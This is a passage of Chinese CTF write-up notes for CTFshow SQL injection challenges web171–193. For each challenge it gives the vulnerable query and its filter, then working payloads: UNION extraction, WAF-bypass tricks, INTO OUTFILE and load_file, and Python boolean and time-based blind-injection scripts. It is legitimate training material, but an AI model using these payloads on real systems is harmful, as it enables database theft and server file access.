select * from user where id=1 and Exp(~(select * from (select version())a));

7. geometrycollection()//mysql5.7貌似不能用
select * from user where id=1 and geometrycollection((select * from(select * from(select user())a)b));

8. multipoint()//mysql5.7貌似不能用
select * from user where id=1 and multipoint((select * from(select * from(select user())a)b));

9. polygon()//mysql5.7貌似不能用
select * from user where id=1 and polygon((select * from(select * from(select user())a)b));

10. multipolygon()//mysql5.7貌似不能用
select * from user where id=1 and multipolygon((select * from(select * from(select user())a)b));

11. linestring()//mysql5.7貌似不能用
select * from user where id=1 and linestring((select * from(select * from(select user())a)b));

12. multilinestring()//mysql5.7貌似不能用
select * from user where id=1 and multilinestring((select * from(select * from(select user())a)b));PGSQL
```



## web171（无过滤）

```sql
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

没有任何过滤，想法就是闭合单引号然后执行想要的sql语句
测试：
![image.png](assets/1638876404000-7d781bd9-866e-4396-ac8c-e72825438034.png)
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1638876423816-a707d67c-6eb3-43f6-a46e-091f27cfd350.png)
回显不同说明存在sql注入
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1638876623857-b4eb7636-a16b-4f40-9b6b-c4850c456026.png)
说明是3列，接下来常规操作，爆库名、表名、字段

```sql
get_database = "1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -"

get_table = "1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='ctfshow_user'-- -"

get_content = "1'union select 1,group_concat(password),3 from ctfshow_user where username='flag'-- -"


1' or 1=1 --+
查询语句

//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
1' or 1=1 --+输出了所有的数据 此时sql语句为

$sql = "select username,password from user where username !='flag' and id = '1' or 1=1 --+' limit 1;";

即 select username,password from user where username !='flag' and id = '1' or 1=1 --+' limit 1; 即 select username,password from user where username !='flag' and id = '1' or 1=1;

可以看到flag是存在于username为flag的用户的数据中，但是条件中username !='flag' and id='1' or 1=1才能select

已知and优先级高于or，所以先username !='flag' and id='1' 再or 1=1

所以假or真，结果为真，恒为真 所有的内容都会被输出

所有的user表中的username，password都被输出了，得到flag的内容


或者直接：
-1' or username = 'flag
```

## web172（无过滤，替换返回值,to_base64()函数绕过）

```sql
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";

//检查结果是否有flag
    if($row->username!=='flag'){
      $ret['msg']='查询成功';
    }
```

这个题返回结果不可以有flag，在这个题中flag是用户名，其对应的密码就是我们要的答案，那怎么输出密码呢？一种方法是不返回用户名flag，只返回密码，
payload：

```
1'union select 1,password from ctfshow_user2 where username='flag'-- -
```

![image.png](assets/1638879167237-5a552496-c15a-4a98-9d98-f336a7b5665d.png)
另一种是对用户名flag进行编码，比如常见的base64，这样也避免了flag出现
payload：

```sql
1'union select to_base64(username),to_base64(password) from ctfshow_user2 where username='flag'-- -
```

![image.png](assets/1638879218464-f6da2146-9c6b-48c5-a996-e0cb697279d9.png)

## web173（无过滤，替换返回值）

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";

//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

对执行结果进行json编码，不能出现flag，那么解题思路同上
payload：

```
1'union select id,1,password from ctfshow_user3 where username='flag' -- -


还可以用replace()函数替换结果，让结果满足过滤
0' union select id,replace(username,'f','g'),password from ctfshow_user3 where username = 'flag
```

![image.png](assets/1638879567565-8daa1c50-bb61-4c38-8058-bebb29cf1863.png)

## web174（无过滤，替换返回值，replace()函数替换返回值满足条件）

```sql
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";

//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

### 思路一：replace()替换返回结果

这个题返回结果中不可以有数字，而flag中一定会有数字，仔细想想可以把flag中的数字用其他字符替换掉，比如将0-9用A-J替换，用大写字母的原因是和flag中的小写字母区别开，防止最后还原的时候出现错误
payload：

```sql
1'union select 'a' ,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', 'A'), '1', 'B'), '2', 'C'), '3', 'D'), '4', 'E'), '5', 'F'), '6', 'G'), '7', 'H'), '8', 'I'), '9', 'J')from ctfshow_user4 where username='flag' -- -
```

![image.png](assets/1638880470240-221db9e8-7544-4196-a917-6161e061646a.png)
flag还原脚本：

```python
'''
Author: KonDream
Date: 2021-12-07 20:25:17
LastEditors:  KonDream
LastEditTime: 2021-12-07 20:29:23
Description:  sql174
'''

payload = "replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, '0', 'A'), '1', 'B'), '2', 'C'), '3', 'D'), '4', 'E'), '5', 'F'), '6', 'G'), '7', 'H'), '8', 'I'), '9', 'J')"

to_replace = 'ctfshow{aAAdFABf-BFJC-EEcC-IbGd-AEGHDCfCdBCA}'

for i in range(10):
    to_replace = to_replace.replace(chr(i + 65), str(i))

print(to_replace)
#ctfshow{a00d501f-1592-44c2-8b6d-04673Cf2d120}
```

### 思路二：bool盲注

这里代码匹配到数字就不会回显，我们可以采用盲注的方式来测试，这里我用的substr语句和页面回显查询出的admin语句来结合利用，写一个脚本

```python
PYTHON
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/3/16 16:24
# blog: www.wlhhlc.top
import requests
url = "http://9ee16fc0-d13a-48ce-a43d-08dbe999e319.challenge.ctf.show:8080/api/v4.php"
dict = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
flag = ""
for i in range(1,50):
    for j in dict:
        payload = f"?id=1' and substr((select password from ctfshow_user4 where username=\"flag\"),{i},1)=\"{j}\"--+"
        gloal = url + payload
        res = requests.get(url=gloal)
        if 'admin' in res.text:
            flag += j
            print(flag)
            break
```

运行后即可得到flag
当然还有其他思路，例如把查询的结果写到一个文件中，然后访问就行

### 思路三：写结果到文件

```php
1'union select username,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/1.txt' -- -
```



## web175（无过滤，导出数据到指定目录下）

```sql
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user5 where username !='flag' and id = '".$_GET['id']."' limit 1;";

//检查结果是否有flag
    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

返回结果中把ASCII值为0-127的字符都过滤了，也就是大部分字符都不允许输出了，其实用174的方法也是可以做的，但是需要替换的字符有点多，所以考虑它既然不让在当前页面回显，就让它换个地方输出，所以构造payload：

### 思路一，写文件

```
1'union select username,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/1.txt' -- -
```

将执行结果输出到1.txt中，然后访问1.txt即可看到flag

### 思路二：时间盲注

```python
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/3/16 16:24
# blog: www.wlhhlc.top
import requests
import time
url = "http://9cb608df-e447-434e-b864-67001d4b869d.challenge.ctf.show:8080/api/v5.php"
dict = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
flag = ""
for i in range(1,50):
    for j in dict:
        payload = f"?id=1' and if(substr((select password from ctfshow_user5 where username=\"flag\"),{i},1)=\"{j}\",sleep(5),0)--+"
        gloal = url + payload
        start = time.time()
        res = requests.get(url=gloal)
        end = time.time()
        if end-start > 4.9:
            flag += j
            print(flag)
            break
```

## web176（开始过滤）

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";

//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

不知道过滤了啥，应该是过滤了联合查询，它说代码过于简单，直接万能密码试一下：
payload：1' or 1=1-- -
成功回显全部数据，并且没有对输出进行过滤，直接拿到flag
![image.png](assets/1638881937908-4cefa04f-a958-4a33-9606-bb5cf43fab72.png)

## web177（空格绕过 space2comment.py）

绕过空格：

```
(),/**/,%0a,%0b,%0c,%09
```



```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";

//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

```
经过测试发现1'or 1=1 -- -无回显，而1'or/**/1=1%23就有回显，猜想是过滤了空格，所以用注释符绕过空格，%23是注释符#的url编码，所以最终payload：1'union/**/select/**/id,username,password/**/from/**/ctfshow_user/**/where/**/username='flag'%23
```

![image.png](assets/1638882492219-ab00f26e-130b-4dfc-bd98-1658b72ae020.png)

```php
手工注入完了尝试一下sqlmap一把梭（请大家不要直接一把梭，建议在学习过程中先手注，掌握了原理后再去使用工具)，sqlmap有自带过滤空格的脚本：space2comment.py，将空格替换为/**/
命令：sqlmap -r sql.txt --tamper "space2comment.py" -D ctfshow_web -T ctfshow_user -C password --dump
```

![image.png](assets/1638882904724-16c48e53-c710-4da1-b6c2-104ad35fc402.png)
结果也是一样的，除了/**/绕过空格外，还有()，%0a，%0c等等

## web178（空格绕过 space2hash.py）

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";

//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

这个题我刚开始在测过滤的时候就直接做出来了，使用1'or(1)%23使条件永真，然后就能看到flag
这样能做出来是因为过滤了/**/而没有过滤()，准确说是过滤了*，所以正常做的话，用其他姿势代替/**/
payload：1'union%0aselect%0aid,username,password%0afrom%0actfshow_user%0awhere%0ausername='flag'%23
![image.png](assets/1638883781228-9a9a8e36-d2ec-430b-b014-27cf061d9432.png)
sqlmap一把梭的话使用space2hash脚本，将空格替换成#后面加6-12个随机大小写字符再加%0a
sqlmap -r sql.txt --tamper "space2hash.py" -- dbs

## web179（空格绕过）

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";

//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

非预期：1'or(1)%23直接出
预期解：过滤了%0a，但没过滤%0c
payload：1'union%0cselect%0cid,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'%23
![image.png](assets/1638884389579-3ae8bc60-235b-4c3c-9529-20bc661da84c.png)

## web180（空格，注释绕过）

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";

//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

非预期：1'or(1)--%0c-直接出
预期解：
还是过滤了*，%0a，应该多过滤了#，因为%23不起作用了，那么可以使用--%0c-进行绕过
payload：
5'union%0cselect%0cid,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'--%0c-
![image.png](assets/1638885261497-fd8bda26-ea83-46fe-ba4b-489f550caed2.png)

## web181（空格，注释绕过）

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";

//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
```

非预期：
payload：1'or(1)limit%0c21,1--%0c-
这是我测试的时候试出来的，这样确实能出，但我没想明白为什么过滤了%0c却还是可以，而其他的语句就不行
![image.png](assets/1638886157944-3ed01e0e-81b4-4982-ad75-c247850819e9.png)
很迷
啊，问过群主了，原因是后台手滑了，把\x0c敲成\0x0c了，真是给我漏了一手Orz
预期解：
已知flag在表中id都为26，那只要让查询条件id=26就行
payload：1234'or(id=26)and'a'='a
1234'or(id=26)是为了满足id=26，and'a'='a是闭合后面的单引号
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1638886512560-5e6dbc9e-f04f-46a5-9ebf-dfaad3a404e9.png)

## web182（空格，注释绕过）

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";

//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
  }
```

没错，这个题群主又手滑打错了，非预期：1'or(1)limit%0c21,1--%0c-
预期：
多过滤了flag，但是没有吊用
payload：1234'or(id=26)and'a'='a
![image.png](assets/1638887531672-135b5917-d0b8-423e-8748-f0b72b24d9b9.png)

## web183（盲注）

```sql
//拼接sql语句查找指定ID用户
  $sql = "select count(pass) from ".$_POST['tableName'].";";
  
  //对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  }
  
  //返回用户表的记录总数
      $user_count = 0;
```

这个题页面上没有输入点也没有回显点，但仔细观察就会发现，需要我们POST一个tableName，然后在user_count返回查询数，比如举个例子，根据前几个题的经验数据库应该是ctfshow_user，那么就可以
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/1638948602499-306c2003-e261-497f-b3d1-9fbc02dcf88b.png)
返回22，确实查到了，但怎么利用呢，考虑where，使条件可控
payload：tableName=`ctfshow_user`where`pass`regexp('ctfshow')
![image.png](assets/1638948763216-81fc3b6a-bf9c-420e-a3b6-2d5f629163d0.png)
查到了flag的前七个字母，返回1证明确实存在，那么就可以进行盲注了，一位一位的查，最后得到答案
poc：

```python
'''
Author: KonDream
Date: 2021-12-08 00:09:13
LastEditors:  KonDream
LastEditTime: 2021-12-08 15:34:20
Description:  
'''
import requests
import string
url = "http://431214d2-96c7-435b-a473-d31a7e0d2a78.challenge.ctf.show/select-waf.php"

payload = "`ctfshow_user`where(substr(`pass`,{},1)regexp('{}'))"

string = string.ascii_lowercase + string.digits + '{-}'

ans = "ctfshow{"

for i in range(9, 46):
    for j in string:
        data = {
            'tableName' : payload.format(str(i), j)
        }
        r = requests.post(url=url, data=data)
        if "$user_count = 1;" in r.text:
            ans += j
            print(ans)
            break
```

## web184（盲注，过滤单双引号，16进制，having替换where）

```php
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }
```

多过滤了where，单双引号，所以字符串不能用了，考虑使用十六进制替换字符串，having替换where
poc：

```python
import requests
import string
import binascii

def str2hex(str):
    ans = ''
    for i in str:
        ans += (hex(ord(i)))[2:]
    return ans


url = "http://6fab4f3b-8b4d-44bb-9cf7-bb3093b3c602.challenge.ctf.show/select-waf.php"

payload = "ctfshow_user group by pass having pass like {}"

string = string.digits + string.ascii_lowercase + '{-}'

flag = 'ctfshow'

for i in range(8, 46):
    for j in string:
        data = {
            'tableName' : payload.format('0x' + str2hex(flag + j + '%'))
        }
        r = requests.post(url=url, data=data)
        if "$user_count = 1;" in r.text:
            flag += j
            print('[*] {}'.format(flag))
            break
```

## web185（盲注，突破数字）


```php
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }
```

过滤了数字，那么考虑联结表字段，即联结两个ctfshow_user，条件是其中一个的pass字段能匹配到某个字符，这里还用到了mysql的数字函数，即select true返回1，select true+true返回2，这样就可以突破数字限制了
poc：

```python
import requests
import string

def hex2true(num):
    ans = 'true'
    if num == 1:
        return ans
    for i in range(num - 1):
        ans += '+true'
    return ans


url = "http://0fb72081-e57f-4bca-a32f-19f0375ccc23.challenge.ctf.show/select-waf.php"

payload = "ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{},true)regexp(char({})))"

string = string.digits + string.ascii_lowercase + '{-}'

flag = 'ctfshow'

for i in range(8, 46):
    for j in string:
        data = {
            'tableName' : payload.format(hex2true(i), hex2true(ord(j)))
        }
        r = requests.post(url=url, data=data)
        if "$user_count = 43;" in r.text:
            flag += j
            print('[*] {}'.format(flag))
            break
#[*] ctfshow{d11fa31f-1474-4468-accc-85b240934aff}
```

## web186（盲注，突破数字）

```php
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\<|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }
```

上一题的姿势这个题没有过滤，所以还是可以打通的

```python
'''
Author: KonDream
Date: 2021-12-09 11:40:27
LastEditors:  KonDream
LastEditTime: 2021-12-09 11:40:28
Description:  
'''
import requests
import string

def hex2true(num):
    ans = 'true'
    if num == 1:
        return ans
    for i in range(num - 1):
        ans += '+true'
    return ans


url = "http://1e17529b-2faf-4057-90e5-078c0b0f2e5d.challenge.ctf.show/select-waf.php"

payload = "ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{},true)regexp(char({})))"

string = string.digits + string.ascii_lowercase + '{-}'

flag = 'ctfshow'

for i in range(8, 46):
    for j in string:
        data = {
            'tableName' : payload.format(hex2true(i), hex2true(ord(j)))
        }
        r = requests.post(url=url, data=data)
        if "$user_count = 43;" in r.text:
            flag += j
            print('[*] {}'.format(flag))
            break
```

## web187（md5注入：ffifdyop）

```php
//拼接sql语句查找指定ID用户
  $sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";

    $username = $_POST['username'];
    $password = md5($_POST['password'],true);

    //只有admin可以获得flag
    if($username!='admin'){
        $ret['msg']='用户名不存在';
        die(json_encode($ret));
    }
```

题意是用户名只能为admin，密码用md5加密，那么就从密码处考虑注入，有一个特殊的字符串：ffifdyop，md5后，276f722736c95d99e921722cf9ed621c，再转成字符串：'or'6，这样就形成了永真式导致注入
![image.png](assets/1639022157934-2897caf6-2c3e-4120-94ac-f0ea50cdc2f4.png)
查看返回请求即可得到flag

## web188（弱比较）

```php
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username}";

  //用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
```

可以看到是通过检索username来列出密码，然后一个弱比较来进行判断，先给出payload

```
username=0&password=0
```

以这道题的数据库为例，这个数据库中的用户名都是以字母开头的数据，而以字母开头的数据在和数字比较时，会被强制转换为0，因此就会相等，后面的pass也是一样的道理
但注意，如果有某个数据不是以字母开头，是匹配不成功的，这种情况怎么办，我们可以用`||`运算符

```
username=1||1&password=0
```

![image.png](assets/1639046391603-9bad36fc-a07b-4f6b-b6e3-ef409d9e6c12.png)
用永真式也是可以的，过滤的or可以用||代替

## web189（布尔盲注,regexp）

```php
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username}";
  
    //用户名检测
  if(preg_match('/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }
```

开局就来个提示，flag在`api/index.php`中
这次尝试`username=0&password=0`登录，发现提示密码错误，说明是密码跟上一题不一样了，不是以字母开头的数据。根据提示，flag的位置在一个文件中，可以用`load_file`来配合`regexp`来进行盲注

> **LOAD_FILE(file_name)：** 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。
>
> **regexp：** mysql中的正则表达式操作符

容易想到默认路径是`/var/www/html/api/index.php`，开始写个脚本进行盲注poc：

```python
'''
Author: KonDream
Date: 2021-12-09 18:49:25
LastEditors:  KonDream
LastEditTime: 2021-12-09 18:59:34
Description:  盲注189
'''

import requests
import string

url = 'http://f99c9132-a52b-4b1d-97bf-60a325a5e311.challenge.ctf.show/api/index.php'

flag = 'ctfshow'

payload = "if(load_file('/var/www/html/api/index.php')regexp('{}'),1,0)"

string = string.digits + string.ascii_lowercase + '{-}'

for i in range(8, 46):
    for j in string:
        data = {
            'username':payload.format(flag + j),
            'password':1
        }
        r = requests.post(url=url, data=data)
        if r'\u67e5\u8be2\u5931\u8d25' in r.text: #返回'查询失败'证明匹配成功
            flag += j
            print('[*] {}'.format(flag))
            break

```

## web190（布尔注入二分法）

```php
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = '{$username}'";

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }
```

还是盲注，不过这次数据库表名都变了，都需要爆一下，具体解释看代码
poc：

```python
'''
Author: KonDream
Date: 2021-12-09 19:28:19
LastEditors:  KonDream
LastEditTime: 2021-12-09 20:25:18
Description:  布尔注入
'''
import requests

url = 'http://ba2f3143-2d16-4b16-a501-7909aa4ece97.challenge.ctf.show/api/'

flag = '' 
# 爆数据库名 ctfshow_fl0g,ctfshow_user
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,f1ag
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
# 爆字段
payload = "select f1ag from ctfshow_fl0g"

for i in range(1, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break

        data = {
            # 如果某个字符比如c大于chr(99),则返回1，否则返回0，根据回显不同最终确定某位置的某字符
            'username':"1' or if(ascii(substr(({}), {}, 1)) > {}, 1, 0)-- -".format(payload, i, mid),
            'password':1
        }
        r = requests.post(url=url, data=data)
        # print(r.text)
        if r'\u5bc6\u7801\u9519\u8bef' in r.text: #返回'查询失败'证明匹配成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
        
```

## web191（布尔注入，过滤了ascii，用ord绕过）

```php
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

过滤了ascii，还可以用ord，效果如下图
![image.png](assets/1639053780232-030a5388-9280-44e4-83e9-58aeed1dfa2d.png)
poc：

```python
'''
Author: KonDream
Date: 2021-12-09 20:28:24
LastEditors:  KonDream
LastEditTime: 2021-12-09 20:38:55
Description:  
'''
'''
Author: KonDream
Date: 2021-12-09 19:28:19
LastEditors:  KonDream
LastEditTime: 2021-12-09 20:27:50
Description:  布尔注入
'''
import requests

url = 'http://ffbad699-b2ff-4aa2-8d23-e4b51f811e44.challenge.ctf.show/api/'

flag = '' 
# 爆数据库名 ctfshow_fl0g,ctfshow_user
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,f1ag
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
# 爆字段
payload = "select f1ag from ctfshow_fl0g"

for i in range(1, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break

        data = {
            # 如果某个字符比如c大于chr(99),则返回1，否则返回0，根据回显不同最终确定某位置的某字符
            'username':"1' or if(ord(substr(({}), {}, 1)) > {}, 1, 0)-- -".format(payload, i, mid),
            'password':1
        }
        r = requests.post(url=url, data=data)
        # print(r.text)
        if r'\u5bc6\u7801\u9519\u8bef' in r.text: #返回'查询失败'证明匹配成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
        
```

## web192（布尔注入，过滤了ord，大小比较绕过/正则匹配绕过）

```php
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii|ord|hex/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

多过滤了ord，那么直接进行字符串比较，poc：

```python
'''
Author: KonDream
Date: 2021-12-09 20:45:17
LastEditors:  KonDream
LastEditTime: 2021-12-09 20:54:22
Description:  
'''
import requests

url = 'http://0e20d1b9-a6d4-495d-8889-263eeb704e1f.challenge.ctf.show/api/'

flag = '' 
# 爆数据库名 ctfshow_fl0g,ctfshow_user
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,f1ag
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
# 爆字段
payload = "select f1ag from ctfshow_fl0g"


for i in range(1, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break

        data = {
            # 如果某个字符比如c大于chr(99),则返回1，否则返回0，根据回显不同最终确定某位置的某字符
            'username':"1' or if(substr(({}), {}, 1) > '{}', 1, 0)-- -".format(payload, i, chr(mid)),
            'password':1
        }
        r = requests.post(url=url, data=data)
        # print(r.text)
        if r'\u5bc6\u7801\u9519\u8bef' in r.text: #返回'查询失败'证明匹配成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

有个尴尬就是服务器中mysql设置是大小写不敏感的，所以爆出来的数据库、表名和flag需要手动转换一下
![image.png](assets/1639054684573-02f7fad3-e18f-48a5-b5ee-c0af6811ee70.png)



或者直接用正则匹配

```python
import requests
url = "http://185fcade-247d-4a43-a4fc-5cd023f84184.challenge.ctf.show:8080/api/"
flag = ""
all_str = "0123456789abcdefghijklmnopqrstuvwxyz-{}"

for i in range(1,99):
    for j in all_str:
        payload = "select group_concat(f1ag) from ctfshow_fl0g"
        username_data = f"admin' and if(substr(({payload}), {i}, 1)regexp('{j}'), 1, 0)=1#"
        data = {'username': username_data,
                'password': 1}
        res = requests.post(url=url, data=data)
        if "密码错误" in res.json()['msg']:
            flag += j
            print(flag)
            break
        if j == "}":
            exit()
```

## web193（布尔注入，过滤了substr,用left/right来组合绕过，或者regexp正则）

```php
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
    if(preg_match('/file|into|ascii|ord|hex|substr/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

### 法一：right、left组合

过滤了substr，考虑组合使用left和right

eg:

```
right(left('abc', i),1); 取第i位
right(left('abcd', 2),1)=b 取第2位为b
```



```python
import requests

url = 'http://06d98f3c-f61b-4e72-8d11-a5c0acaba6f2.challenge.ctf.show/api/'

flag = '' 
# 爆数据库名 ctfshow_flxg,ctfshow_user
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆表名 id,f1ag
# payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"
# 爆字段
payload = "select f1ag from ctfshow_flxg"


for i in range(1, 46):
    # 查找ascii从32-128的所有字符
    low = 32
    high = 128
    # 二分查找 提升效率
    while True:
        mid = (low + high) >> 1
        if low == mid:  # low处对应字符即为数据库中的字符
            flag += str(chr(mid + 1))
            print('[*] {}'.format(flag))
            break

        data = {
            #  right(left('abc', i),1); 取第i位
            'username':"1' or if(right(left(({}), {}), 1) > '{}', 1, 0)-- -".format(payload, i, chr(mid)),
            'password':1
        }
        r = requests.post(url=url, data=data)
        # print(r.text)
        if r'\u5bc6\u7801\u9519\u8bef' in r.text: #返回'查询失败'证明匹配成功
            low = mid # 查询成功，区间向右靠拢
        else:
            high = mid # 查询失败，区间向左靠拢
```

![image.png](assets/1639058223341-7634227e-1c17-47fb-990a-120604ae49d7.png)

### 法二：regexp正则匹配

把substr给ban了，正则没ban，可以用正则来写，代码中的`^`代表从第一位开始匹配

```python
import requests
url = "http://4c28d2d4-bcae-4e08-9e24-dfa0cb694305.challenge.ctf.show:8080/api/"
flag = ""
